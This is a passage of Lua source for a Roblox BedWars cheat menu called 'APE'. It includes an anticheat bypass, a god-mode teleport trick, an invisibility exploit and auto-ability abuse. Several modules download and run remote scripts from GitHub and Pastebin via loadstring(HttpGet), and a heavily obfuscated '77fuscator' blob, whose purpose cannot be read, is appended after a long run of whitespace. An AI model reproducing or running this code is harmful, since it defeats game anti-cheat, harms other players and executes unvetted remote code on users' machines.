		local HeartBeatConnect2 = tick()
		local Value = HeartBeatConnect2 - (HeartBeatConnect2 - HeartBeatConnect <= 999 and 0 or 999)
		HeartBeatConnect = math.max(HeartBeatConnect,Value)
	end
	Disabler = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AnticheatBypassV2",
	    HoverText = "better AnticheatBypass reel",
        Function = function(callback)
            if callback then
				SendNotify = true
				NoDisable = true
				task.spawn(function()
					repeat
						task.wait()
						RenderSteppedConnection = game:GetService("RunService").RenderStepped:Connect(getRenderStepped)
						HeartbeatConnection = game:GetService("RunService").Heartbeat:Connect(getHeartBeat)
						local item = getItemNear("scythe")
						repeat task.wait() until item
						if item and lplr.Character.HandInvItem.Value == item.tool and bedwars.CombatController then
							if DisablerMode.Value == "MoveDirection" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.Humanoid.MoveDirection
									})
								end
							elseif DisablerMode.Value == "LookVector" then
								if DisablerSpeed.Enabled then
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector * DisablerTable.Values.MainSpeed
									})
								else
									bedwars.ClientHandler:Get("ScytheDash"):SendToServer({
										direction = lplr.Character.HumanoidRootPart.CFrame.LookVector
									})
								end
							end
							if entityLibrary.isAlive and entityLibrary.character.Head.Transparency ~= 0 then
								bedwarsStore.scythe = tick() + 1
							end
						elseif item and lplr.Character.HandInvItem.Value ~= item.tool and bedwars.CombatController then
							if SendNotify then
								if DisablerNotify.Value == "Vape" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
								elseif DisablerNotify.Value == "Print" then
									print(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Warn" then
									warn(DisablerTable.Messages.Context3)
								elseif DisablerNotify.Value == "Combined" then
									warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context1,DisablerTable.Values.Duration)
									print(DisablerTable.Messages.Context3)
									warn(DisablerTable.Messages.Context3)
								end
								SendNotify = false
							end
							if DisablerMissing.Value == "Continue" then
								task.wait(DisablerTable.Values.Duration)
								SendNotify = true
								NoDisable = true
							elseif DisablerMissing.Value == "Disable" then
								NoDisable = false
							end
							if not NoDisable then
								Disabler.ToggleButton(false)
								return
							end
						elseif not item then
							if DisablerNotify.Value == "Vape" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
							elseif DisablerNotify.Value == "Print" then
								print(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Warn" then
								warn(DisablerTable.Messages.Context4)
							elseif DisablerNotify.Value == "Combined" then
								warningNotification(DisablerTable.Messages.Title,DisablerTable.Messages.Context2,DisablerTable.Values.Duration)
								print(DisablerTable.Messages.Context4)
								warn(DisablerTable.Messages.Context4)
							end
							Disabler.ToggleButton(false)
							return
						end
					until not Disabler.Enabled
				end)
			else
				HeartbeatConnection:Disconnect()
				RenderSteppedConnection:Disconnect()
            end
        end,
		ExtraText = function()
			return DisablerMode.Value
		end
    })
	DisablerMode = Disabler.CreateDropdown({
		Name = "Mode",
		List = {
			"MoveDirection",
			"LookVector"
		},
		HoverText = "Disabler Mode",
		Function = function() end,
	})
	DisablerMissing = Disabler.CreateDropdown({
		Name = "Missing Scythe",
		List = {
			"Continue",
			"Disable"
		},
		HoverText = "Actions that will occur when the Scythe is missing",
		Function = function() end,
	})
	DisablerNotify = Disabler.CreateDropdown({
		Name = "Notification",
		List = {
			"Vape",
			"Print",
			"Warn",
			"Combined"
		},
		HoverText = "Notification that will be displayed",
		Function = function() end,
	})
	DisablerDuration = Disabler.CreateSlider({
		Name = "Duration",
		Min = 1,
		Max = 10,
		HoverText = "Notification's Duration",
		Function = function() end,
		Default = 5
	})
	DisablerSpeedVal = Disabler.CreateSlider({
		Name = "Speed",
		Min = 1,
		Max = 100,
		HoverText = "Direction Speed",
		Function = function() end,
		Default = 90
	})
	DisablerSpeed = Disabler.CreateToggle({
		Name = "Speed",
		Default = true,
		HoverText = "Adds speed to the direction",
		Function = function() end,
	})
	DisablerNotification = Disabler.CreateToggle({
		Name = "Notification",
		Default = true,
		HoverText = "Notifies you when certain actions happen",
		Function = function() end,
	})
end)

local Nebula = GuiLibrary.ObjectsThatCanBeSaved.RenderWindow.Api.CreateOptionsButton({
	["Name"] = "NebulaSky",
	["Function"] = function(callback)
		if callback then
			task.spawn(function() 

				local Vignette = true


				local Lighting = game:GetService("Lighting")
				local ColorCor = Instance.new("ColorCorrectionEffect")
				local SunRays = Instance.new("SunRaysEffect")
				local Sky = Instance.new("Sky")
				local Atm = Instance.new("Atmosphere")


				for i, v in pairs(Lighting:GetChildren()) do
					if v then
						v:Destroy()
					end
				end

				ColorCor.Parent = Lighting
				SunRays.Parent = Lighting
				Sky.Parent = Lighting
				Atm.Parent = Lighting

				if Vignette == true then
					local Gui = Instance.new("ScreenGui")
					Gui.Parent = StarterGui
					Gui.IgnoreGuiInset = true

					local ShadowFrame = Instance.new("ImageLabel")
					ShadowFrame.Parent = Gui
					ShadowFrame.AnchorPoint = Vector2.new(0,1,0)
					ShadowFrame.Position = UDim2.new(0,0,0,0)
					ShadowFrame.Size = UDim2.new(0,0,0,0)
					ShadowFrame.BackgroundTransparency = 1
					ShadowFrame.Image = ""
					ShadowFrame.ImageTransparency = 1
					ShadowFrame.ZIndex = 0
				end


				ColorCor.Brightness = 0.1
				ColorCor.Contrast = 0.5
				ColorCor.Saturation = -0.3
				ColorCor.TintColor = Color3.fromRGB(255, 235, 203)

				SunRays.Intensity = 0.075
				SunRays.Spread = 0.727

				Sky.SkyboxBk = "rbxassetid://13581437029"
				Sky.SkyboxDn = "rbxassetid://13581439832"
				Sky.SkyboxFt = "rbxassetid://13581447312"
				Sky.SkyboxLf = "rbxassetid://13581443463"
				Sky.SkyboxRt = "rbxassetid://13581452875"
				Sky.SkyboxUp = "rbxassetid://13581450222"
				Sky.SunAngularSize = 10

				Lighting.Ambient = Color3.fromRGB(2,2,2)
				Lighting.Brightness = 0.3
				Lighting.ColorShift_Bottom = Color3.fromRGB(0,0,0)
				Lighting.ColorShift_Top = Color3.fromRGB(0,0,0)
				Lighting.EnvironmentDiffuseScale = 0.2
				Lighting.EnvironmentSpecularScale = 0.2
				Lighting.GlobalShadows = true
				Lighting.OutdoorAmbient = Color3.fromRGB(0,0,0)
				Lighting.ShadowSoftness = 0.2
				Lighting.ClockTime = 15
				Lighting.GeographicLatitude = 45
				Lighting.ExposureCompensation = 0.5

				Atm.Density = 0.364
				Atm.Offset = 0.556
				Atm.Color = Color3.fromRGB(179, 59, 249)
				Atm.Decay = Color3.fromRGB(155, 212, 255)
				Atm.Glare = 0.36
				Atm.Haze = 1.72	
                end)
			end
		end
    })

runFunction(function()
		local Reinject = {["Enabled"] = false}
		Reinject = GuiLibrary["ObjectsThatCanBeSaved"]["APEWindow"]["Api"].CreateOptionsButton({
			["Name"] = "Reinject",
			["HoverText"] = "Reinjects Vape To Load Modules",
			   ["Function"] = function(Callback)
					Enabled = Callback
					if Enabled then
						Reinject["ToggleButton"](false)
						GuiLibrary["SelfDestruct"]()
						loadstring(game:HttpGet("https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua", true))()
	
	
					end
				end
		})
	end)

runFunction(function()
   Pink = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
	["Name"] = "PinkTheme",
	["Function"] = function(callback)
		if callback then
			task.spawn(function()
				for i,v in pairs(lightingService:GetChildren()) do
					if v:IsA("Atmosphere") or v:IsA("Sky") or v:IsA("PostEffect") then
						v:Remove()
					end
				end
				local sky = Instance.new("Sky")
				sky.SkyboxBk = "rbxassetid://1546230803"
				sky.SkyboxDn = "rbxassetid://1546231143"
				sky.SkyboxFt = "rbxassetid://1546230803"
				sky.SkyboxLf = "rbxassetid://1546230803"
				sky.SkyboxRt = "rbxassetid://1546230803"
				sky.SkyboxUp = "rbxassetid://1546230451"
				sky.Parent = lightingService
				pcall(function() workspace.Clouds:Destroy() end)
				local damagetab = debug.getupvalue(bedwars.DamageIndicator, 2)
				damagetab.strokeThickness = false
				damagetab.textSize = 32
				damagetab.blowUpDuration = 0
				damagetab.baseColor = Color3.fromRGB(255, 132, 178)
				damagetab.blowUpSize = 32
				damagetab.blowUpCompleteDuration = 0
				damagetab.anchoredDuration = 0
				debug.setconstant(bedwars.DamageIndicator, 83, Enum.Font.LuckiestGuy)
				debug.setconstant(bedwars.DamageIndicator, 102, "Enabled")
				debug.setconstant(bedwars.DamageIndicator, 118, 0.3)
				debug.setconstant(bedwars.DamageIndicator, 128, 0.5)
				debug.setupvalue(bedwars.DamageIndicator, 10, {
					Create = function(self, obj, ...)
						task.spawn(function()
							obj.Parent.Parent.Parent.Parent.Velocity = Vector3.new((math.random(-50, 50) / 100) * damagetab.velX, (math.random(50, 60) / 100) * damagetab.velY, (math.random(-50, 50) / 100) * damagetab.velZ)
							local textcompare = obj.Parent.TextColor3
							if textcompare ~= Color3.fromRGB(85, 255, 85) then
								local newtween = tweenService:Create(obj.Parent, TweenInfo.new(0.5, Enum.EasingStyle.Linear), {
									TextColor3 = (textcompare == Color3.fromRGB(76, 175, 93) and Color3.new(0, 0, 0) or Color3.new(0, 0, 0))
								})
								task.wait(0.15)
								newtween:Play()
							end
						end)
						return tweenService:Create(obj, ...)
					end
				})
				local colorcorrection = Instance.new("ColorCorrectionEffect")
				colorcorrection.TintColor = Color3.fromRGB(255, 199, 220)
				colorcorrection.Brightness = 0.05
				colorcorrection.Parent = lightingService
				debug.setconstant(require(lplr.PlayerScripts.TS.controllers.global.hotbar.ui.healthbar["hotbar-healthbar"]).HotbarHealthbar.render, 16, 16745650)
			end)
		end
	end
})
end)

runFunction(function()
        local FlyGui = {Enabled = false}
        FlyGui = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
            Name = "FlyLoader",
            HoverText = "Loads FlyGui credits to Red",
            Function = function(callback)
                if callback then
                    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                        loadstring(game:HttpGet(('https://pastebin.com/raw/h5QDPy6s'),true))()
						FlyGui.ToggleButton(false)
						warningNotification("APE", "Fly Gui Should Be Loaded Up", 5)
					else
                end
            end
		end
    })
end)

	runFunction(function()
		local InfiniteYield = {Enabled = false}
		InfiniteYield = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "InfiniteYield",
			Function = function(callback)
				if callback then
					task.spawn(function()
					loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
					InfiniteYield["ToggleButton"](false)
					warningNotification("APE", "Loaded Infinite Yield!", 5)
					end)
				end
			end,
			HoverText = "infinite yield lel"
		})
	end)

runFunction(function()
	local AnimationPlayer = {Enabled = false}
	local AnimationPlayerBox = {Value = "11335949902"}
	local AnimationPlayerSpeed = {Speed = 1}
	local playedanim
	AnimationPlayer = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
		Name = "InvisibleExploit",
		HoverText = "put you underground",
		Function = function(callback)
			if callback then 
				if entityLibrary.isAlive then 
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
                        lplr.Character.Humanoid.CameraOffset = Vector3.new(0, 3 / -2, 0)
                        lplr.Character.HumanoidRootPart.Size = Vector3.new(2, 3, 1.1)
						
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(0 / 10)
						table.insert(AnimationPlayer.Connections, playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end))
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end
				table.insert(AnimationPlayer.Connections, lplr.CharacterAdded:Connect(function()
					repeat task.wait() until entityLibrary.isAlive or not AnimationPlayer.Enabled
					task.wait(0.5)
					if not AnimationPlayer.Enabled then return end
					if playedanim then 
						playedanim:Stop() 
						playedanim.Animation:Destroy()
						playedanim = nil 
					end
					local anim = Instance.new("Animation")
					local suc, id = pcall(function() return string.match(game:GetObjects("rbxassetid://"..AnimationPlayerBox.Value)[1].AnimationId, "%?id=(%d+)") end)
                    if not suc then
                        id = AnimationPlayerBox.Value
                    end
                    anim.AnimationId = "rbxassetid://"..id
					local suc, res = pcall(function() playedanim = entityLibrary.character.Humanoid.Animator:LoadAnimation(anim) end)
					if suc then
						playedanim.Priority = Enum.AnimationPriority.Action4
						playedanim.Looped = true
						playedanim:Play()
						playedanim:AdjustSpeed(AnimationPlayerSpeed.Value / 10)
						playedanim.Stopped:Connect(function()
							if AnimationPlayer.Enabled then
								AnimationPlayer.ToggleButton(false)
								AnimationPlayer.ToggleButton(false)
							end
						end)
					else
						warningNotification("AnimationPlayer", "failed to load anim : "..(res or "invalid animation id"), 5)
					end
				end))
			else
				if playedanim then playedanim:Stop() playedanim = nil end
			end
		end
	})
end)

	runFunction(function()
		local HostPanelExploit = {Enabled = false}
		local oldhostattribute = nil
		HostPanelExploit = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "VisualHostPanel",
			HoverText = "only visual",
			Function = function(callback)
				task.spawn(function()
					if oldhostattribute == nil then 
						oldhostattribute = (lplr:GetAttribute("Cohost") or lplr:GetAttribute("Host")) and true or false
					end
					if not callback and bedwars.ClientStoreHandler:getState().Game.customMatch and oldhostattribute then 
						return
					end
					lplr:SetAttribute("Cohost", callback)
				end)
			end
		})
	end)

runFunction(function()
    local AutoSkywars = {Enabled = false}
    AutoSkywars = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "AutoSkywars",
	HoverText = "tp you to middle sometimes works (only skywars)",
        Function = function(callback)
            if callback then
                task.spawn(function()
                    if bedwarsStore.queueType:find("skywars") then
                        if bedwarsStore.matchState ~= 0 then return end
                        repeat task.wait() until bedwarsStore.matchState ~= 0
                        if (not AutoSkywars.Enabled) then return end
                        task.wait(0.1)
                        local tween = tweenService:Create(lplr.Character.HumanoidRootPart, TweenInfo.new(0.6, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {CFrame = workspace.SpectatorPlatform.floor.CFrame - Vector3.new(0,1.5,5)})
                        tween:Play()
                        tween.Completed:Wait()
                        task.wait(0.5)
                        workspace.SpectatorPlatform.floor.CanCollide = false
                    end
                end)
            end
        end
    })
end)

function IsAlive(plr)
    plr = plr or lplr
    if not plr.Character then return false end
    if not plr.Character:FindFirstChild("Head") then return false end
    if not plr.Character:FindFirstChild("Humanoid") then return false end
    if plr.Character:FindFirstChild("Humanoid").Health < 0.11 then return false end
    return true
end

runFunction(function()
    local GodMode = {Enabled = false}
    GodMode = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
        Name = "PartialGodMode",
        Function = function(callback)
            if callback then
				spawn(function()
					while task.wait() do
						if (not GodMode.Enabled) then return end
						if (not GuiLibrary.ObjectsThatCanBeSaved.FlyOptionsButton.Api.Enabled) and (not GuiLibrary.ObjectsThatCanBeSaved.InfiniteFlyOptionsButton.Api.Enabled) then
							for i, v in pairs(game:GetService("Players"):GetChildren()) do
								if v.Team ~= lplr.Team and IsAlive(v) and IsAlive(lplr) then
									if v and v ~= lplr then
										local TargetDistance = lplr:DistanceFromCharacter(v.Character:FindFirstChild("HumanoidRootPart").CFrame.p)
										if TargetDistance < 25 then
											if not lplr.Character.HumanoidRootPart:FindFirstChildOfClass("BodyVelocity") then
												repeat task.wait() until bedwarsStore.matchState ~= 0
												if not (v.Character.HumanoidRootPart.Velocity.Y < -10*5) then
													lplr.Character.Archivable = true
			
													local Clone = lplr.Character:Clone()
													Clone.Parent = workspace
													Clone.Head:ClearAllChildren()
													gameCamera.CameraSubject = Clone:FindFirstChild("Humanoid")
				
													for i,v in pairs(Clone:GetChildren()) do
														if string.lower(v.ClassName):find("part") and v.Name ~= "HumanoidRootPart" then
															v.Transparency = 1
														end
														if v:IsA("Accessory") then
															v:FindFirstChild("Handle").Transparency = 1
														end
													end
				
													lplr.Character.HumanoidRootPart.CFrame = lplr.Character.HumanoidRootPart.CFrame + Vector3.new(0,100000,0)
				
													game:GetService("RunService").RenderStepped:Connect(function()
														if Clone ~= nil and Clone:FindFirstChild("HumanoidRootPart") then
															Clone.HumanoidRootPart.Position = Vector3.new(lplr.Character.HumanoidRootPart.Position.X, Clone.HumanoidRootPart.Position.Y, lplr.Character.HumanoidRootPart.Position.Z)
														end
													end)
				
													task.wait(0.3)
													lplr.Character.HumanoidRootPart.Velocity = Vector3.new(lplr.Character.HumanoidRootPart.Velocity.X, -1, lplr.Character.HumanoidRootPart.Velocity.Z)
													lplr.Character.HumanoidRootPart.CFrame = Clone.HumanoidRootPart.CFrame
													gameCamera.CameraSubject = lplr.Character:FindFirstChild("Humanoid")
													Clone:Destroy()
													task.wait(0.15)
												end
											end
										end
									end
								end
							end
						end
					end
				end)
			end
        end
    })
end)

	runFunction(function()
		local AutoEmber = {Enabled = false}
		AutoEmber = GuiLibrary.ObjectsThatCanBeSaved.APEWindow.Api.CreateOptionsButton({
			Name = "4BigGuysExploit",
			HoverText = "Automatically uses the ember ability.",
			Function = function(callback)
				if callback then 
					task.spawn(function()
						repeat 
							local saber = getItem("infernal_saber")
							if killauraNearPlayer and saber then 
								bedwars.ClientHandler:Get("HellBladeRelease"):SendToServer({chargeTime = 0.5, player = lplr, weapon = saber.tool})
							end
							task.wait()
						until not AutoEmber.Enabled
					end)
				end
			end
		})
	end)
	
loadstring(game:HttpGet("https://raw.githubusercontent.com/RandomUserRay/PrivateLMAO1/main/blacklisted.lua"))()

warningNotification("APE", "Loaded Succesfully By RayHafz!", 5)
																																																																						
do local a=[[77fuscator 0.5.0 - discord.gg/CEHsVcBcuf]];return(function(b,c,d,e,f,f,g,h,i,j,k,l,l,m,n,o,p,q,r,s,t,u,u,v,w,w,x,y,y,z,z,z,ba,ba,bb,bb,bb,bc)local bd,be,bf,bg,bh,bi,bj,bk,bl,bm,bn,bo,bp,bq,br,bs,bt,bu,bv,bw,bx,by,bz,ca,cb,cc,cd,ce,cf,cg,ch,ci,cj,ck,cl,cm,cn,co,cp,cq,cr=0 while true do if bd<=17 then if bd<=8 then if bd<=3 then if bd<=1 then if 1>bd then be,bf,bg,bh,bi,bj,bk=string.sub,table.concat,string.char,tonumber,next,(table.create or function(cs,ct)local cu={};for cv=1,cs do cu[cv]=ct;end;return cu;end)or tostring else bl=1 end else if bd<3 then bm=function(bi)local bk,cs,ct,cu,cv,cw,cx,cy=0 while true do if bk<=5 then if bk<=2 then if bk<=0 then cs,ct=g,g else if 2~=bk then cu=bj(#bi)else cv=256 end end else if bk<=3 then cw=bj(cv)else if 4==bk then for bj=0,(cv-1)do cw[bj]=bg(bj)end else cx=1 end end end else if bk<=8 then if bk<=6 then cy=function()local bj,cz,da=0 while true do if bj<=2 then if bj<=0 then cz=bh(be(bi,cx,cx),36)else if bj~=2 then cx=(cx+1)else da=bh(be(bi,cx,cx+cz-1),36)end end else if bj<=3 then cx=(cx+cz)else if bj~=5 then return da else break end end end bj=bj+1 end end else if 7<bk then cu[1]=cs else cs=bg(cy())end end else if bk<=9 then while cx<#bi and#a==d do local a=cy()if cw[a]then ct=cw[a]else ct=(cs..be(cs,1,1))end cw[cv]=(cs..be(ct,1,1))cu[#cu+1],cs,cv=ct,ct,(cv+1)end else if 10==bk then return bf(cu)else break end end end end bk=bk+1 end end else bn=bm(b)end end else if bd<=5 then if bd<5 then bo={}else c={x,l,k,o,q,m,y,w,i,u,s,j,nil,nil,nil};end else if bd<=6 then bp=v else if 8>bd then bq=bp(bo)else br,bs=1,(-16391+(function()local a,b,c,d=0 while true do if a<=1 then if a==0 then b,c=0,1 else d=(function(q,s)local v=0 while true do if v==0 then q(s(s,s),q(s and s,q))else break end v=v+1 end end)(function(q,s)local v=0 while true do if v<=2 then if v<=0 then if(b>122)then return q end else if v<2 then b=(b+1)else c=((c*344)%29389)end end else if v<=3 then if(((c%934))==467 or((c%934))>467)then c=((c-397)%20759)return q else return q(q((q and q),q),q(s,q))end else if 5~=v then return q(q((s and q),q),q(s,q))else break end end end v=v+1 end end,function(q,s)local v=0 while true do if v<=2 then if v<=0 then if b>286 then return q end else if 2~=v then b=(b+1)else c=(((c-83))%34178)end end else if v<=3 then if(c%1562)<781 then c=((c-699))%19386 return q(q(q and q,q),s(q,q))else return q end else if 5~=v then return q else break end end end v=v+1 end end)end else if 3>a then return c;else break end end a=a+1 end end)())end end end end else if bd<=12 then if bd<=10 then if 10~=bd then bt={}else bu=function(a,b)local c,d=0 while true do if c<=1 then if c==0 then d=0 else for q=0,31 do local s=a%2 local v=(b%2)if s==0 then if(v==1)then b=b-1 d=(d+2^q)end else a=a-1 if not(v~=0)then d=d+2^q else b=(b-1)end end b=(b/2)a=(a/2)end end else if c==2 then return d else break end end c=c+1 end end end else if 11<bd then bw=function()local a,b,c=0 while true do if a<=1 then if a==0 then b,c=h(bn,br,br+2)else b,c=bu(b,bs),bu(c,bs);end else if a<=2 then br=(br+2);else if a==3 then return((bv(c,8))+b);else break end end end a=a+1 end end else bv=function(a,b)local c=0 while true do if c<1 then return((a*2^b));else break end c=c+1 end end end end else if bd<=14 then if bd<14 then do for a,b in o,l(bl)do bt[a]=b;end;end;else bx=bt end else if bd<=15 then by=function(a,b)local c=0 while true do if 0==c then return p(a/2^b);else break end c=c+1 end end else if 17~=bd then bz=((2^32)-1)else ca=function(a,b)local c=0 while true do if c==0 then return(((a+b)-bu(a,b))/2)else break end c=c+1 end end end end end end end else if bd<=26 then if bd<=21 then if bd<=19 then if bd~=19 then cb=bw()else cc=function(a,b)local c=0 while true do if c>0 then break else return(bz-ca(bz-a,bz-b))end c=c+1 end end end else if bd>20 then ce=bw()else cd=function(a,b,c)local d=0 while true do if d<1 then if c then local c=(a/2^(b-1))%2^((c-1)-(b-1)+1)return c-c%1 else local b=(2^(b-1))return(((a%(b+b)>=b)and 1)or 0)end else break end d=d+1 end end end end else if bd<=23 then if bd~=23 then cf=function()local a,b,c,d,p=0 while true do if a<=1 then if 0<a then b,c,d,p=bu(b,cb),bu(c,cb),bu(d,cb),bu(p,cb);else b,c,d,p=h(bn,br,(br+3))end else if a<=2 then br=(br+4);else if 4~=a then return(bv(p,24)+bv(d,16)+bv(c,8))+b;else break end end end a=a+1 end end else cg=function()local a,b=0 while true do if a<=1 then if a==0 then b=bu(h(bn,br,br),cb)else br=(br+1);end else if a~=3 then return b;else break end end a=a+1 end end end else if bd<=24 then ch,ci,cj=nil else if bd<26 then ch=(-14488+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a>0 then c=48533 else b=526 end else if a<=2 then d=3 else if a~=4 then p=270 else q=540 end end end else if a<=7 then if a<=5 then s=12318 else if 7>a then v=385 else w=137 end end else if a<=8 then x=35083 else if a==9 then y=254 else be=340 end end end end else if a<=15 then if a<=12 then if 11<a then bg=170 else bf=2 end else if a<=13 then bh=19255 else if 15~=a then bi=1 else bj=423 end end end else if a<=18 then if a<=16 then bk=240 else if a==17 then bs=0 else bw,by=bs,bi end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if 1~=ce then cc(ca(ca,ca)and ca(ca,ca),cc(cc,(ca and ca))and cc(ca,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bk then local bk=bs while true do bk=(bk+bi)if not(bk~=bi)then return cc else break end end end else if 2>ce then bw=(bw+bi)else by=((by-bj)%bh)end end else if ce<=3 then if((by%be)<bg)then local be=bs while true do be=(be+bi)if((be>bf)or be==bf)then if(be<d)then return cc(ca(ca,(ca and cc)),cc(ca,ca))else break end else by=(by+y)%x end end else local x=bs while true do x=(x+bi)if(x<bf)then return cc else break end end end else if ce<5 then return ca else break end end end ce=ce+1 end end,function(x,y)local be=0 while true do if be<=2 then if be<=0 then if(bw>w)then local w=bs while true do w=w+bi if not(w~=bf)then break else return x end end end else if 2~=be then bw=bw+bi else by=((by*v)%s)end end else if be<=3 then if((by%q)>p)then local p=bs while true do p=(p+bi)if(p==bi or p<bi)then by=(by*b)%c else if not(not(p==d))then break else return x(y(x,y),x(y,x))end end end else local b=bs while true do b=b+bi if(b<bf)then return x else break end end end else if be~=5 then return y else break end end end be=be+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)());else ci=((-25303+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz=0 while true do if a<=10 then if a<=4 then if a<=1 then if a~=1 then b=40425 else c=236 end else if a<=2 then d=960 else if 4>a then p=1920 else q=33223 end end end else if a<=7 then if a<=5 then s=2 else if 7~=a then v=894 else w=201 end end else if a<=8 then x=3 else if a~=10 then y=1330 else be=5906 end end end end else if a<=15 then if a<=12 then if 11<a then bg=665 else bf=617 end else if a<=13 then bh=211 else if a==14 then bi=33389 else bj=787 end end end else if a<=18 then if a<=16 then bk=1 else if 18>a then bs=0 else bw,by=bs,bk end end else if a<=19 then bz=(function(ca,cc)local ce=0 while true do if ce==0 then cc(cc(ca,ca),ca(cc,cc))else break end ce=ce+1 end end)(function(ca,cc)local ce=0 while true do if ce<=2 then if ce<=0 then if bw>bh then local bh=bs while true do bh=bh+bk if not(bh~=bk)then return cc else break end end end else if 1==ce then bw=(bw+bk)else by=((by-bj)%bi)end end else if ce<=3 then if(by%y)<bg then local y=bs while true do y=(y+bk)if(y==bk or y<bk)then by=(by*bf)%be else if not(y~=x)then break else return cc(cc(cc,cc),(ca(cc,cc)and cc(ca,cc)))end end end else local y=bs while true do y=(y+bk)if not(y~=s)then break else return cc end end end else if ce<5 then return cc else break end end end ce=ce+1 end end,function(y,be)local bf=0 while true do if bf<=2 then if bf<=0 then if(bw>w)then local w=bs while true do w=(w+bk)if not(not(w==s))then break else return be end end end else if bf==1 then bw=(bw+bk)else by=((by+v)%q)end end else if bf<=3 then if((by%p)>d)then local d=bs while true do d=(d+bk)if(d<bk or d==bk)then by=((by*c)%b)else if not(not(d==x))then break else return be(y(y,be and y),be(be,y))end end end else local b=bs while true do b=(b+bk)if b>bk then break else return y end end end else if 5~=bf then return y else break end end end bf=bf+1 end end)else if 20==a then return by;else break end end end end end a=a+1 end end)()));end end end end else if bd<=31 then if bd<=28 then if 27<bd then ck=function()local a,b,c,d,p,q,s=0 while true do if a<=3 then if a<=1 then if 1~=a then b,c=cf(),cf()else if(b==0 and c==0)then return 0;end;end else if 2==a then d=1 else p=((cd(c,1,20)*(2^32))+b)end end else if a<=5 then if a==4 then q=cd(c,21,31)else s=(((-1)^cd(c,32)))end else if a<=6 then if(not(q~=0))then if(not(p~=0))then return s*0;else q=1;d=0;end;elseif(not(q~=2047))then if(not(p~=0))then return(s*(1/0));else return(s*(0/0));end;end;else if 8~=a then return s*2^(q-1023)*(d+(p/(2^52)))else break end end end end a=a+1 end end else cj=(-1671+(function()local a,b,c,d,p,q,s,v,w,x,y,be,bf,bg,bh,bi,bj,bk,bs,bw,by,bz,ca,cc,ce,cs,ct,cu,cv,cw,cx,cy,cz=0 while true do if a<=15 then if a<=7 then if a<=3 then if a<=1 then if a<1 then b=409 else c=818 end else if 3>a then d=28939 else p=222 end end else if a<=5 then if 5~=a then q=389 else s=38485 end else if 7~=a then v=1166 else w=583 end end end else if a<=11 then if a<=9 then if 8<a then y=425 else x=9454 end else if a<11 then be=4509 else bf=442 end end else if a<=13 then if a==12 then bg=292 else bh=3 end else if a==14 then bi=1696 else bj=848 end end end end else if a<=23 then if a<=19 then if a<=17 then if a>16 then bs=10108 else bk=579 end else if a<19 then bw=252 else by=908 end end else if a<=21 then if 21>a then bz=5205 else ca=470 end else if 23>a then cc=746 else ce=1816 end end end else if a<=27 then if a<=25 then if 25~=a then cs=18568 else ct=2 end else if a<27 then cu=1 else cv=421 end end else if a<=29 then if a~=29 then cw=0 else cx,cy=cw,cu end else if a<=30 then cz=(function(da,db,dc,dd)local de=0 while true do if de<1 then da(db(dd,dd,dc,dd),dc(db,da,db,dd),dc(dc,db,dc,dc),dd((db and da),dd,dc,dc))else break end de=de+1 end end)(function(da,db,dc,dd)local de=0 while true do if de<=2 then if de<=0 then if((cx>cv))then local cv=cw while true do cv=(cv+cu)if(cv<ct)then return db else break end end end else if de>1 then cy=((cy+cc)%cs)else cx=(cx+cu)end end else if de<=3 then if((not((cy%ce)~=by)or(((cy%ce))>by)))then local by=cw while true do by=by+cu if((not(by~=cu)or by<cu))then cy=(cy-ca)%bz else if not(not(by==ct))then return db(da(dc,da,da,((db and dc))),dc(db,db,da,((dc and dd))),dc(da,dd,da,dc),((da(dc,((dd and db)),db and dc,da)and da((dc and dd),dc and da,dd,dc))))else break end end end else local by=cw while true do by=by+cu 